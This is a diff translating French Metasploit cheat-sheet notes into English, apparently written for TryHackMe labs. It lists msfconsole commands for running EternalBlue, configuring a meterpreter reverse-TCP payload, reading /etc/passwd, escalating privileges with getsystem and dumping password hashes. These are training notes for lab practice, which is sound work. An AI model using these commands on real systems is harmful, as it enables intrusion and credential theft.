@@ -9,72 +9,72 @@ last_updated: 2024-01-01
 
 ## 📖 Description
 
-> Framework d'exploitation open-source. Contient des centaines d'exploits, payloads et modules auxiliaires.
+> Open-source exploitation framework. Contains hundreds of exploits, payloads, and auxiliary modules.
 
 ---
 
-## 🚀 Démarrage
+## 🚀 Getting Started
 
 ```bash
-# Lancer msfconsole
+# Launch msfconsole
 msfconsole
 
-# Initialiser la base de données (première fois)
+# Initialise the database (first time)
 msfdb init
 ```
 
 ---
 
-## 📋 Commandes essentielles
+## 📋 Essential Commands
 
-### Recherche et sélection
+### Search and select
 
 ```bash
-# Rechercher un module
-search <terme>
+# Search for a module
+search <term>
 search type:exploit name:eternalblue
 search cve:2021-44228
 
-# Utiliser un module
+# Use a module
 use exploit/windows/smb/ms17_010_eternalblue
-use 0   # (numéro du résultat de search)
+use 0   # (number from search results)
 
-# Infos sur le module actuel
+# Info on current module
 info
 ```
 
 ### Configuration
 
 ```bash
-# Voir les options requises
+# View required options
 show options
 show advanced
 
-# Configurer les options
+# Set options
 set RHOSTS 10.10.X.X
-set LHOST 10.9.X.X    # ton IP VPN THM
+set LHOST 10.9.X.X    # your THM VPN IP
 set LPORT 4444
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
-# Voir les payloads compatibles
+# View compatible payloads
 show payloads
 ```
 
-### Lancement
+### Launch
 
 ```bash
-# Vérifier si la cible est vulnérable (sans exploiter)
+# Check if target is vulnerable (without exploiting)
 check
 
-# Lancer l'exploit
+# Run the exploit
 run
 exploit
 ```
 
-### Meterpreter — Post-exploitation
+### Meterpreter — Post-Exploitation
 
 ```bash
-# Infos système
+# System info
 sysinfo
 getuid
 
@@ -87,10 +87,10 @@ cd /tmp
 upload /local/file.sh /tmp/file.sh
 download /etc/passwd /local/passwd.txt
 
-# Shell système
+# System shell
 shell
 
-# Élévation de privilèges
+# Privilege escalation
 getsystem
 hashdump
 
@@ -100,28 +100,28 @@ run post/multi/recon/local_exploit_suggester
 
 ---
 
-## 📋 Modules utiles
+## 📋 Useful Modules
 
 | Type | Module | Usage |
 |------|--------|-------|
-| Auxiliary | `scanner/portscan/tcp` | Scan de ports |
+| Auxiliary | `scanner/portscan/tcp` | Port scanning |
 | Auxiliary | `scanner/smb/smb_ms17_010` | Check EternalBlue |
-| Exploit | `multi/handler` | Recevoir un reverse shell |
-| Post | `multi/recon/local_exploit_suggester` | Suggestions privesc |
-| Post | `linux/gather/hashdump` | Dump des hashs Linux |
+| Exploit | `multi/handler` | Catch reverse shells |
+| Post | `multi/recon/local_exploit_suggester` | PrivEsc suggestions |
+| Post | `linux/gather/hashdump` | Linux hash dump |
 
 ---
 
-## 💡 Tips & astuces
+## 💡 Tips & Tricks
 
-- `multi/handler` pour recevoir des shells créés avec msfvenom
-- `sessions -l` pour lister les sessions actives
-- `sessions -i 1` pour interagir avec une session
-- `background` pour mettre une session en arrière-plan
+- Use `multi/handler` to catch shells created with msfvenom
+- `sessions -l` to list active sessions
+- `sessions -i 1` to interact with a session
+- `background` to background a session
 
 ---
 
-## 🔗 Ressources
+## 🔗 Resources
 
 - [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
 - [HackTricks — Metasploit](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
